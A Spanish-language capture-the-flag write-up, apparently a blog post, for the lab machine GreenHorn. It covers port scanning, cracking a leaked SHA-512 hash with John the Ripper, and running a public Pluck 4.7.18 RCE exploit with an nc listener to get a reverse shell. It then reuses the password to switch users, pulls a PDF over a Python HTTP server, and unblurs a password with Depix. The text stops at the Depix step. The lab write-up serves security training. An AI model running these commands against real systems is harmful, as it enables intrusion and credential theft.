---
title: "GreenHorn"
date: "2024-11-30T17:00:00-05:00"
type: "maquinas"
draft: false
tags: ["CVE", "linux", "RCE", "pluk"]
---

### Descripción : 

Una máquina bastante sencilla en la que la enumeración es la clave para hallar la primera contraseña, que te servirá para usar un CVE y obtener una shell. Ya para el escalamiento de privilegios, algo absurdo y poco útil, pero entretenido.

# Enumeración

Como siempre, vamos a empezar descubriendo qué puertos hay y con qué servicios.

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allports
```

<a href="https://imgur.com/CVStAE2"><img src="https://i.imgur.com/CVStAE2.png" title="source: imgur.com" /></a>

```shell
nmap -sCV -p80,22,3000 IP -oN target
```
<a href="https://imgur.com/VoVjrkv"><img src="https://i.imgur.com/VoVjrkv.png" title="source: imgur.com" /></a>

Vemos una página en el puerto 80, por lo que vamos a agregar la IP al /etc/hosts.

Cuando abrimos la página, vemos que en la parte inferior dice "admin". Si le damos clic, nos lleva a un inicio de sesión. Dejaremos esto para más adelante.

<a href="https://imgur.com/iX0hq2a"><img src="https://i.imgur.com/iX0hq2a.png" title="source: imgur.com" /></a>

Ahora vamos a revisar la página, pero por el puerto 3000. Después de buscar un rato, encontramos una especie de repositorio. Si revisamos estos archivos, encontramos un archivo llamado pass.php.

<a href="https://imgur.com/rWOUO3B"><img src="https://i.imgur.com/rWOUO3B.png" title="source: imgur.com" /></a>

Esto nos deja un hash que, si usamos un hash identifier, nos dice que es un SHA-512. Por lo tanto, con John the Ripper lo podemos decodificar.

```shell
john --format=Raw-SHA512 hash.txt /usr/share/wordlist/rockyou.txt
```

<a href="https://imgur.com/vJ89JOu"><img src="https://i.imgur.com/vJ89JOu.png" title="source: imgur.com" /></a>

Si volvemos al *login* que habíamos encontrado y usamos esta contraseña, nos permite iniciar sesión. Si miramos qué tecnologías tiene la página, nos damos cuenta de que tiene un **Pluck 4.7.18**, que tiene un CVE que podemos explotar con la contraseña que encontramos. Si copiamos este [exploit de GitHub](https://github.com/b0ySie7e/Pluck_Cms_4.7.18_RCE_Exploit/tree/main), podemos obtener una shell.

Primero, vamos a crear un entorno virtual de Python:

```shell
python -m venv "Enviroment name"
source "Enviroment name"/bin/activate
```

E instalamos este módulo para que el script de GitHub funcione sin problemas:

```python
pip3 install requests_toolbelt
```

Ahora ponemos un `nc` en escucha y ejecutamos el script con sus parámetros:

```shell
nc -lvnp 4444 
python3 exploit_pluckv4.7.18_RCE.py --password iloveyou1 --ip 10.10.16.47 --port 4444 --host http://greenhorn.htb
```

Y con esto tenemos una shell:

<a href="https://imgur.com/JS1Fppw"><img src="https://i.imgur.com/JS1Fppw.png" title="source: imgur.com" /></a>

Si tratamos de cambiar a uno de los dos usuarios, no vamos a encontrar forma de hacerlo. Por lo tanto, al final tratamos de usar la misma contraseña con el usuario **Junior** y nos funcionó.

Si miramos dentro de la carpeta de **Junior**, hallamos dos cosas: un PDF y la flag. Vamos a montar un servidor HTTP con Python para llevar ese PDF a nuestra máquina.

```python
python3 -m http.server [puerto]
wget http://IP:[puerto]/'Using OpenVAS.pdf'
```

Dentro del pdf nos encontramos una especie de carta con una contraseña difuminada

<a href="https://imgur.com/fKDsNls"><img src="https://i.imgur.com/fKDsNls.png" title="source: imgur.com" /></a>

Si buscamos formas de conseguir esta contraseña nos vamos a encontrar este github [Depix](https://github.com/spipm/Depix), ya viendo esto vamos a hacer dos cosas clonar el repositorio y extraer la imagen del pdf en una pagina que nos permita esto, para luego descifrar la contraseña.

```shell
git clone https://github.com/spipm/Depix
python3 depix.py -p ../imagen-pdf -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
```
